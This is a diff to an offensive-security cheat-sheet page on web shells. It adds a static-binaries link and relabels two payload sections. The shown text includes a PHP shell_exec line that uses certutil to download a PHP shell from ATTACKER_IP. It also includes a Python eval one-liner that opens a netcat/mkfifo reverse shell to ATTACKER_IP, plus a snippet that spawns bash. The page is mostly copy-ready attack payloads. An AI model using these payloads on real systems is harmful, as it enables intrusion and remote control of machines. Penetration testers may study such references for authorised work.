@@ -4,7 +4,7 @@ sidebar_position: 2
 
 # WebShell's - Binaries
 
-- **Static Binaries:** <a class="button button--outline button--warning" href="https://repology.org/">REPOLOGY.org</a> <a class="button button--outline button--warning" href="https://ubuntu.pkgs.org/">PKGS.org</a>
+- **Static Binaries:** <a class="button button--outline button--warning" href="https://repology.org/">REPOLOGY.org</a> <a class="button button--outline button--warning" href="https://ubuntu.pkgs.org/">PKGS.org</a> <a class="button button--outline button--info" href="https://github.com/andrew-d/static-binaries">Binaries GitHub</a>
 
 
 ## PHP
@@ -25,7 +25,7 @@ sidebar_position: 2
 
 <br/>
 
-- **`PHP` Downloads The Shell From `Python Server`**
+- **Download From `Python` Server**
 
 ```php
 '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://ATTACKER_IP/php-shell.php php-shell.php & nslookup test ATTACKER_IP ");' 
@@ -35,12 +35,15 @@ sidebar_position: 2
 
 ## Python
 
-- Executing a `SHELL` from a Running `Python` Instance
-
-```py
-eval('__import__("os").system("mkfifo /tmp/dktkcfp; nc ATTACKER_IP 8888 0</tmp/dktkcfp | /bin/sh >/tmp/dktkcfp 2>&1; rm /tmp/dktkcfp")')
-```
+- **Executing a `SHELL` from a Running `Python` Instance**
 
 ```py
 __import__('os').system('bash')
 ```
+
+- **Executing a `Reverse SHELL` from a Running `Python` Instance**
+
+```py
+eval('__import__("os").system("mkfifo /tmp/dktkcfp; nc ATTACKER_IP PORT 0</tmp/dktkcfp | /bin/sh >/tmp/dktkcfp 2>&1; rm /tmp/dktkcfp")')
+```
+
